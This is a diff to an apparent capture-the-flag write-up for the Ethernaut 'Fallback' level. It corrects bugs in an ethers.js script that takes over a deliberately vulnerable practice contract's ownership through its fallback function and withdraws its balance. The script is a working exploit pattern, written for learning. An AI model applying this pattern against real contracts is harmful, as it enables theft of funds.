@@ -75,12 +75,12 @@ function withdraw() public onlyOwner {
 ### Scripted Solution
 
 ```javascript
-const ethers = require('ethers')
 const fs = require('fs')
+const ethers = require('ethers')
 require('dotenv').config({ path: './.env' })
 
 /**
- * Initialize Ethers objects needed to interact with the blockchain and 
+ * Initialize Ethers objects needed to interact with the blockchain and
  * contract.
  */
 async function setup(contractName) {
@@ -89,7 +89,7 @@ async function setup(contractName) {
   // Create player wallet
   const playerWallet = new ethers.Wallet(process.env.PRIVATE_KEY)
   // Create player wallet signer - an abstraction of an Ethereum account
-  const playerWalletSigner = await wallet.connect(provider)
+  const playerWalletSigner = await playerWallet.connect(provider)
   // Create contract instance - an abstraction of the deployed contract code
   const contractAbi = fs.readFileSync(`./${contractName}.abi`, 'utf8')
   const contract = new ethers.Contract(
@@ -111,18 +111,17 @@ async function main() {
     playerWallet,
     playerWalletSigner,
     contract: fallbackContract,
-  } = setup('Fallback')
+  } = await setup('Fallback')
 
   // Contribute 0.0001 ether via Fallback contract's 'contribute' function
   const contributionValue = ethers.utils.parseEther('0.0001')
   console.log(
     `Sending Fallback 'contribute' ${contributionValue.toString()}...`
   )
-  await fallbackContract
-    .contribute({
-      value: contributionValue,
-    })
-    .wait(1)
+  const fallbackContribute = await fallbackContract.contribute({
+    value: contributionValue,
+  })
+  await fallbackContribute.wait(1)
 
   // Confirm contribution via Fallback contract's 'getContribution' function
   console.log(
@@ -135,13 +134,12 @@ async function main() {
   console.log(
     `Sending ${contributionValue.toString()} to Fallback contract address...`
   )
-  await playerWalletSigner
-    .sendTransaction({
-      to: process.env.CONTRACT_ADDRESS,
-      value: contributionValue,
-      gasPrice: 20000000000,
-    })
-    .wait(1)
+  const fallbackReceive = await playerWalletSigner.sendTransaction({
+    to: process.env.CONTRACT_ADDRESS,
+    value: contributionValue,
+    gasPrice: 20000000000,
+  })
+  await fallbackReceive.wait(1)
 
   // Check current Fallback contract 'owner'
   const fallbackContractOwner = await fallbackContract.owner()
@@ -152,7 +150,8 @@ async function main() {
 
     // Withdraw funds via Fallback contract's 'withdraw' function
     console.log('Withdrawing contract balance...')
-    await fallbackContract.withdraw().wait(1)
+    const fallbackWithdraw = await fallbackContract.withdraw()
+    await fallbackWithdraw.wait(1)
 
     // Check new Fallback contract balance
     const contractBalance = await provider.getBalance(
